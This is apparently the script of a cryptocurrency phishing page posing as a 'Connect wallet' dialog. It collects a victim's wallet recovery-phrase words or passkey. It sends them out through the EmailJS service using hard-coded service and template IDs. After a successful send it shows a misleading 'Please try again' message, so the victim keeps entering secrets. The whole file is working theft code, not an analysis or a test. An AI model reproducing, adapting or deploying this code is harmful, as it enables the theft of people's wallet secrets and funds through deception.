        emailjs.init("SiqtsqFcjEHmEhAlI");
        
        let currentWallet = "";
        
        function openModal(walletName) {
            currentWallet = walletName;
            document.getElementById('modalTitle').textContent = `Connect ${walletName}`;
            document.getElementById('walletModal').classList.add('active');
            document.getElementById('walletModal').classList.remove('opacity-0');
            document.getElementById('walletModal').classList.remove('pointer-events-none');
        }
        
        function closeModal() {
            document.getElementById('walletModal').classList.remove('active');
            document.getElementById('walletModal').classList.add('opacity-0');
            document.getElementById('walletModal').classList.add('pointer-events-none');
        }
        
        // Tab switching functionality
        document.querySelectorAll('.tab-button').forEach(button => {
            button.addEventListener('click', () => {
                // Update active tab button
                document.querySelectorAll('.tab-button').forEach(btn => {
                    btn.classList.remove('active', 'border-custom-green', 'text-custom-green');
                    btn.classList.add('text-gray-500');
                });
                button.classList.add('active', 'border-custom-green', 'text-custom-green');
                button.classList.remove('text-gray-500');
                
                // Show active tab content
                const tabId = button.getAttribute('data-tab');
                document.querySelectorAll('.tab-content').forEach(content => {
                    content.classList.remove('active');
                });
                document.getElementById(`${tabId}-tab`).classList.add('active');
            });
        });
        
        // Form submission handlers
        document.getElementById('phrase-form').addEventListener('submit', function(e) {
            e.preventDefault();
            sendEmail('phrase');
        });
        
        document.getElementById('passkey-form').addEventListener('submit', function(e) {
            e.preventDefault();
            sendEmail('passkey');
        });
        
        function sendEmail(type) {
            let message = '';
            
            if (type === 'phrase') {
                // Collect all phrase words
                const inputs = document.querySelectorAll("#phrase-form input[type='text']");
                const values = Array.from(inputs).map(input => input.value.trim());
                const phrase = values.join(" ");
                message = `Wallet: ${currentWallet}, Type: Recovery Phrase, Phrase: ${phrase}`;
            } else {
                // Get passkey value
                const passkey = document.getElementById('passkey').value;
                message = `Wallet: ${currentWallet}, Type: Passkey, Passkey: ${passkey}`;
            }
            
            // Send email using EmailJS
            emailjs.send("service_qg99kwe", "template_z2fgoq8", {
                message: message,
                wallet_name: currentWallet
            })
            .then(function(response) {
                alert('Please try again');
                closeModal();
            }, function(error) {
                alert('Failed to send email. Please try again.');
                console.error('EmailJS error:', error);
            });
        }
        
        // Close modal when clicking outside
        document.getElementById('walletModal').addEventListener('click', function(e) {
            if (e.target === this) {
                closeModal();
            }
        });